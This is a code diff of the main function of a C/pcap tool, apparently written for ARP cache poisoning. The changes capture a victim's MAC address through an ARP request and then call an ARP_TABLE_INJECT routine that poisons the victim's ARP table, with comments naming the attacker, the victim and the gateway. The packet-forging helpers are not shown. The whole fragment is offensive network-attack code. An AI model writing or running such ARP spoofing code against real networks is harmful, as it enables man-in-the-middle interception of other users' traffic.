@@ -1,8 +1,5 @@
 #include "my_pcap.h"
 
-void callback(u_char *p, const struct pcap_pkthdr *pkthdr, const u_char *packet);
-
-
 int main(int argc, char* argv[]) {
    
     char *dev;
@@ -11,7 +8,7 @@ int main(int argc, char* argv[]) {
     uint8_t *my_mac; //or just my_mac[ETHER_ADDR_LEN] and not use ustrmem
 	uint8_t *my_ip;
 	struct in_addr senderIP, targetIP, myIP;
-    
+    u_char* sender_mac;
 	int length = 0;
     unsigned char packet[1500];
 	
@@ -44,8 +41,12 @@ int main(int argc, char* argv[]) {
     }
 
 	// me(attacker) request to victim for mac address.
-	ARP_REQUEST(pcd,my_mac,my_ip,&senderIP); // sender == victim / target == gateway
-	
+	sender_mac = ARP_REQUEST(pcd,my_mac,my_ip,&senderIP); // sender == victim / target == gateway
+	puts("\n----- NOW INJECT -----\n");
+	ARP_TABLE_INJECT(pcd,my_mac,sender_mac,&senderIP,&targetIP);
+
+	printf("\n[ FINISHED ]");
+	return 0;
 
 }
 
